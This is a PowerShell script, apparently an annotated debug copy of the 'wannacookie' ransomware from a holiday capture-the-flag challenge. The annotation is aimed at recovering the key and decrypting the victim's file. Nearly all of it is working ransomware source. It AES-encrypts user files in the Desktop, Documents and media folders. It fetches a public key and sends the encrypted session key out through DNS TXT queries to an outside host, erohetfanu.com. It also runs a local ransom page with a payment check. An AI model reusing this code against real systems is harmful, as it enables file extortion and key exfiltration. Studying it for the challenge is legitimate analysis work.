# this being the most versbose version written
# it should reveal all the needed information
# needed to crack the passwords file previously encrypted
# from there you should be able to make the keygen
# that will follow:
$functions = {
    function encrypt_decrypt_file($key, $File, $enc_it) {
        Write-Host "Entering encrypt_decrypt_file function";
        Write-Host "The key is: $key";
        [byte[]] $key = $key;
        $Suffix = "`.wannacookie";
        [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
        [System.Int32] $KeySize = $key.Length * 8;
        $AESP = New-Object 'System.Security.Cryptography.AesManaged';
        $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
        $AESP.BlockSize = 128;
		#  This hack due to back padding error in Crypto of this app
		$AESP.Padding = [System.Security.Cryptography.PaddingMode]::None;
        $AESP.KeySize = $KeySize;
        $AESP.Key = $key;
		Write-Host "Current Encryption settings Default entry: $AESP";
        $READFILE = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);
        if ($enc_it) {
            $DestFile = $File + $Suffix
        } else {
            $DestFile = ($File -replace $Suffix)
        };
		Write-Host "Destingation filename set to: $DestFile";
        $WRITEFILE = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create);
        if ($enc_it) {
            $AESP.GenerateIV();
            $WRITEFILE.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4);
            $WRITEFILE.Write($AESP.IV, 0, $AESP.IV.Length);
            $Transform = $AESP.CreateEncryptor()
			Write-Host "Files open for encryption AESP set: $AESP";
        } else {
            [Byte[]] $LenIV = New-Object Byte[] 4;
            $READFILE.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;
            $READFILE.Read($LenIV, 0, 3) | Out-Null;
            [Int] $LIV = [System.BitConverter]::ToInt32($LenIV, 0);
            [Byte[]] $IV = New-Object Byte[] $LIV;
            $READFILE.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null;
            $READFILE.Read($IV, 0, $LIV) | Out-Null;
            $AESP.IV = $IV;
			Write-Host "Files open for decryption AESP set: $AESP";
            $Transform = $AESP.CreateDecryptor()
        };
        $CRYPTOSTREAM = New-Object System.Security.Cryptography.CryptoStream($WRITEFILE, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write);
        [Int] $DATACOUNTER = 0;
        [Int] $BlockSzBts = $AESP.BlockSize / 8;
        [Byte[]] $Data = New-Object Byte[] $BlockSzBts;
        Do {
            $DATACOUNTER = $READFILE.Read($Data, 0, $BlockSzBts);
            $CRYPTOSTREAM.Write($Data, 0, $Count)
        }
        While ($DATACOUNTER -gt 0);
	    Write-Host "Data has been sent through the Crypto Stream";
        Write-Host "The transformed data length: $Data.length";
        $CRYPTOSTREAM.FlushFinalBlock();
        $CRYPTOSTREAM.Close();
        $READFILE.Close();
        $WRITEFILE.Close();
        Write-Host "Flushed and closed Files"
        #clear -variable -Name "key";
        #Remove-Item $File
        Write-Host "Leaving encrypt_decrypt_file function";
    }
};

function hex2bin {
    param($HXchar);
    Write-Host "Entering hex2bin function";
    $HXchar = $HXchar -split '(..)' | ? {
        $_
    };
    ForEach($hexvalue in $HXchar) {
        [Convert]::ToInt32($hexvalue, 16)
    }
    Write-Host "Leaving hex2bin function";
};

function ascii2hex() {
    param($ascii_char);
    Write-Host "Entering ascii2hex function";
    $hexstring = '';
    $ascii_array = $ascii_char.ToCharArray();;
    Foreach($element in $ascii_array) {
        $hexstring = $hexstring + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
    };
    Write-Host "Leaving hex2bin function";
	Write-Host "The resulting ascii2hex resutls are: "$hexstring -replace ' '; 
    return $hexstring -replace ' '
};

function hex2ascii() {
    param($hexchar);
    Write-Host "Entering hex2ascii function";
    $ascii_string;
    $hexchar -split '(..)' | ? {
        $_
    } | forEach {
        [char]([convert]::toint16($_, 16))
    } | forEach {
        $ascii_string = $ascii_string + $_
    };
	Write-Host "The resulting hex2ascii resutls are: "$ascii_string
    Write-Host "Leaving hex2ascii function";
    return $ascii_string
};

function bin2hex {
    param($bin_array);
    Write-Host "Entering bin2hex function";
    $hex_string = '';
    ForEach($bin_char in $bin_array) {
        $hex_char = "{0:x}" -f[Int] $bin_char;
        if ($hex_char.length -eq 1) {
            $hex_string += '0' + $hex_char
        } else {
            $hex_string += $hex_char
        }
    };
	Write-Host "The resulting bin2hex resutls are: "$hex_string
    Write-Host "Leaving bin2hex function";
    return $hex_string
};

function xor_it {
    param($b1, $b2);
    Write-Host "Entering xor_it function";
    $b1 = $(hex2bin $b1);
    $b2 = $(hex2bin $b2);
    $cont = New-Object Byte[] $b1.count;
    if ($b1.count -eq $b2.count) {
        for ($i = 0; $i -lt $b1.count; $i++) {
            $cont[$i] = $b1[$i] -bxor $b2[$i]
        }
    };
	Write-Host "The resulting xor_it resutls are: "$cont
    Write-Host "Leaving xor_it function";
    return $cont
};

function bin2gzip {
    param([byte[]] $Data);
    Write-Host "Leaving bin2gzip function";
    Process {
        $gzipout = [System.IO.MemoryStream]::new();
        $gStream = New-Object System.IO.Compression.GzipStream $gzipout, ([IO.Compression.CompressionMode]::Compress);
        $gStream.Write($Data, 0, $Data.Length);
        $gStream.Close();
        Write-Host "Leaving bin2gzip function";
		Write-Host "The resulting bin2gzip resutls are: "$gzipout.ToArray()
        return $gzipout.ToArray()
    }
};

function gzip2bin {
    param([byte[]] $dataarray);
    Write-Host "Entering gzip2bin function";
    Process {
        $gzipdata = New-Object System.IO.MemoryStream(, $dataarray);
        $gzipout = New-Object System.IO.MemoryStream;
        $gStream = New-Object System.IO.Compression.GzipStream $gzipdata, ([IO.Compression.CompressionMode]::Decompress);
        $gStream.CopyTo($gzipout);
        $gStream.Close();
        $gzipdata.Close();
        [byte[]] $byteArr = $gzipout.ToArray();
        Write-Host "Leaving gzip2bin function";
        Write-Host "The resulting gzip2bin resutls are: "$byteArr
		return $byteArr
    }
};

function sha1hash([String] $inputstring) {
    Write-Host "Entering sha1hash function";
    $stringbuilder = New-Object System.Text.StringBuilder;
    [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($inputstring)) | % {
        [Void] $stringbuilder.Append($_.ToString("x2"))
    };
    $stringbuilder.ToString()
    Write-Host "Leaving sha1hash function";

};

function public_key_encryption($key_bytes, [byte[]] $pub_bytes) {
    Write-Host "Entering public_key_encryption function";
    $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
    $cert.Import($pub_bytes);
	Write-Host "The certificate before encryption: "$cert;
    $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true);
	Write-Host "This is the certificate after it is encrypted with the IV" ;
	Write-Host "The IV: "$key_bytes;
	Write-Host "The encrypted cert: "$encKey;
    Write-Host "Leaving public_key_encryption function";
	Write-Host "Resulting encrypted key: "$(bin2hex $encKey);
    return $(bin2hex $encKey)
};

function encrypt_and_decrypt {
    param($key, $allfiles, $make_cookie);
    Write-Host "Entering encrypt_and_decrypt function";
    $tcount = 12;
    for ($file = 0; $file -lt $allfiles.length; $file++) {
        while ($true) {
            $running = @(Get-Job | Where-Object {
                $_.State -eq 'Running'
            });
            if ($running.Count -le $tcount) {
                Start-Job -ScriptBlock {
                    param($key, $File, $true_false);
					Write-Host "Attempting to process file: "$File;
					Write-Host "Using the encryption key of: " $key;
                    try {
                        encrypt_decrypt_file $key $File $true_false
						Write-Host "Passed the encryption routing";
                    } catch {
						Write-Host "Failed the encryption routine";
                        $_.Exception.Message | Out-String | Out-File $($env:userprofile + '\Desktop\ps_log.txt') -append
                    }
                } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions;
                break
            } else {
				Write-Host "Taking a nap for 200 ms";
                Start-Sleep -m 200;
                continue
            }
        }
    Write-Host "Leaving encrypt_and_decrypt function";
    }
};

function get_txt_dns($subdomain) {
    Write-Host "Entering get_txt_dns function";
    $hexstring = '';
    foreach($superdomain in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$subdomain.erohetfanu.com" -Type TXT).Strings, 10) -1)) {
        $hexstring += $(Resolve-DnsName -Server erohetfanu.com -Name "$superdomain.$subdomain.erohetfanu.com" -Type TXT).Strings
    };
	Write-Host "The resulting DNS resutls are: "$hexstring; 
    Write-Host "Leaving get_txt_dns function";
    return (hex2ascii $hexstring)
};

function string2char($astring, $size = 32) {
    Write-Host "Entering string2char function";
    $new_arr = @();
    $chunk_index = 0;
    foreach($i in 1..$($astring.length / $size)) {
        $new_arr += @($astring.substring($chunk_index, $size));
        $chunk_index += $size
    };
    Write-Host "Leaving string2char function";
    return $new_arr
};

function get_cookie_id($enc_key) {
    Write-Host "Entering get_cookie_id function";
    $enc_chunk = (string2char $enc_key);
    foreach($j in $enc_chunk) {
        if ($enc_chunk.IndexOf($j) -eq 0) {
            $user_cookie_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        } else {
            $(Resolve-DnsName -Server erohetfanu.com -Name "$user_cookie_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        }
    };
    Write-Host "Leaving get_cookie_id function";
    return $user_cookie_id
};

function wannacookie {
    Write-Host "Entering wannacookie function";
    $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
	# This is the actual killswitch below - uncomment and figure out the DNS Name thats not registered ...
    #if ($null -ne((Resolve-DnsName -Name $(hex2ascii $(bin2hex $(xor_it $(bin2hex $(gzip2bin $(hex2bin $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
    #    return
    #};
    #if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or(Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {
    #    return
    #};
    $public_key = [System.Convert]::FromBase64String($(get_txt_dns("7365727665722E637274")));
    Write-Host "The public key is current set to: $public_key";
	$random_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char] 01.. [char] 255) + ([char[]]([char] 01.. [char] 255)) + 0..9 | sort {
        Get-Random
    })[0..15] -join '')) | ? {
        $_ -ne 0x00
    });
    # display in terminal the $random_key variable
    Write-Host "Random key per session: $(bin2hex $random_key)"
    $hex_random_key = $(bin2hex $random_key);
    Write-Host "The random IV key in hex: $hex_random_key";
	$sha1_hex_random_key = $(sha1hash $hex_random_key);
    Write-Host "The random IV key in hex of Sha1 Hash: $sha1_hex_random_key";
	$public_key_encryption_key = (public_key_encryption $random_key $public_key).ToString();
    Write-Host "The encrypted public key in hex: $public_key_encryption_key";
	$cookie_id = (get_cookie_id $public_key_encryption_key);
	Write-Host "The cookie ID in hex: $cookie_id";
    $date_time = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n");
	Write-Host "The current date / time: $date_time";
	[array] $elfdb_list = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile + '\Desktop'), $($env:userprofile + '\Documents'), $($env:userprofile + '\Videos'), $($env:userprofile + '\Pictures'), $($env:userprofile + '\Music')) -Recurse | where {
        !$_.PSIsContainer
    } | Foreach-Object {
        $_.Fullname
    });
	Write-Host "List of files to encrypt: $elfdb_list";
    encrypt_and_decrypt $random_key $elfdb_list $true;
    Write-Host "Finished processing the files to be encrypted";
	#clear -variable -Name "$hex_random_key";
    #clear -variable -Name "$random_key";
    $evilurl = 'http://127.0.0.1:8080/';
	Write-Host "Set the Evil URL to open in browser: $evilurl";
    $html_raw_contents = @{
        # modified for beverity sake (sanity)
        'GET /' = $([IO.File]::ReadAllText("C:\Users\subinacls\evil.html"));
        #'GET /' = $(get_txt_dns(ascii2hex "source.min.html"));
        'GET /close' = '<p>Bye!</p>'
    };
    Start-Job -ScriptBlock {
        param($url);
        Start-Sleep 10;
        Add -type -AssemblyName System.Windows.Forms;
        start-process "$url" -WindowStyle Maximized;
        Start-sleep 2;
        [System.Windows.Forms.SendKeys]::SendWait("{F11}")
    } -Arg $evilurl;
    $http_listener = New-Object System.Net.HttpListener;
    $http_listener.Prefixes.Add($evilurl);
    $http_listener.Start();
    Write-Host "The server has started as a background job";
    try {
        $close_connection = $false;
        while ($http_listener.IsListening) {
            $http_context = $http_listener.GetContext();
			Write-Host "Get web server context (polling)";
            $Request = $http_context.Request;
            Write-Host "The request captured by the web server: $Request";
			$Response = $http_context.Response;
            Write-Host "The response capture by the web server: $Response";
			$Received = '{0} {1}' -f $Request.httpmethod, $Request.url.localpath;
			Write-Host "The received data as captured: $Received";
            if ($Received -eq 'GET /') {
				Write-Host "This was a GET request captured by the web server";
                $html_display = $html_raw_contents[$Received]
            }
            elseif($Received -eq 'GET /decrypt') {
				Write-Host "This was a decrypt request from the web server";
                $user_supplied_key = $Request.QueryString.Item("key");
                if ($sha1_hex_random_key -eq $(sha1hash $user_supplied_key)) {
					Write-Host "This is a pass condition";
					Write-Host "The user supplied SHA1 value supplied matched the stored SHA1 value";
                    $user_supplied_key = $(hex2bin $user_supplied_key);
					Write-Host "The users supplied key is converted to HEX: "$user_supplied_key;
                    [array] $wanncookie_list = $(Get-ChildItem -Path $($env:userprofile) -Recurse -Filter *.wannacookie | where {
                        !$_.PSIsContainer
                    } | Foreach-Object {
                        $_.Fullname
                    });
					Write-Host "The files to be decrypted are as follows: $wanncookie_list";
                    encrypt_and_decrypt $user_supplied_key $wanncookie_list $false;
					Write-Host "The files have been processed through the encrypt_and_decrypt function as DECRYPT";
					Write-Host "[POSSIBLE BROWSER CONTROL HERE] modify this and send additional hooks?";
                    $html_display = "Files have been decrypted!";
					Write-Host "Close the web server when finished";
                    $close_connection = $true
                } else {
					Write-Host "The user supplied key does not match the stored keys";
					Write-Host "Session Key Hex: "$random_key;
					Write-Host "Session Key Hex: "$(bin2hex $random_key);
					Write-Host "Users Attempt Raw: "$user_supplied_key
                    $html_display = "Invalid Key!"
                }
            }
            elseif($Received -eq 'GET /close') {
                $close_connection = $true;
                Write-Host "Closing the web server"
				$html_display = $html_raw_contents[$Received]
            }
            elseif($Received -eq 'GET /cookie_is_paid') {
                $check_paid_cookie = $(Resolve-DnsName -Server erohetfanu.com -Name("$cookie_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings;
                Write-Host "Check if user cookie ID is paid from DNS query"
				Write-Host "Can hack the reply here and change it to paid and thus make the application do the work."
				if ($check_paid_cookie.length -eq 32) {
					Write-Host "It only checks the reply length at this point, set check_paid_cookie to 32 bytes 'random'"
                    $html_display = $check_paid_cookie
                } else {
					Write-Host "The check paid cookie value is not 32 bytes in length $check_paid_cookie.length"
                    $html_display = "UNPAID|$cookie_id|$date_time"
					Write-Host "set new display to user about unpaid status"
                }
            } else {
				Write-Host "Any other request which are not designatied 404 error"
                $Response.statuscode = 404;
                $html_display = '<h1>404 Not Found</h1>'
				Write-Host "HTML resutls cast here - can implant any additional hooks"
            };
            $buffer = [Text.Encoding]::UTF8.GetBytes($html_display);
			Write-Host "The HTML has been encoded UTF8"
            $Response.ContentLength64 = $buffer.length;
            $Response.OutputStream.Write($buffer, 0, $buffer.length);
            $Response.Close();
			Write-Host "Check if the connection close is GET true or false"
            if ($close_connection) {
				Write-Host "Connection set to True"
                $http_listener.Stop();
                return
            }
			Write-Host "Guess it was not a close request :)"
        }
    } finally {
        Write-Host "Just make sure the server will close, eventually"
		$http_listener.Stop()
		Write-Host "End of wannacookie"		
    }
    Write-Host "Leaving wannacookie function";
};
Write-Host "Staring the WannaCookie Challenge"
wannacookie;
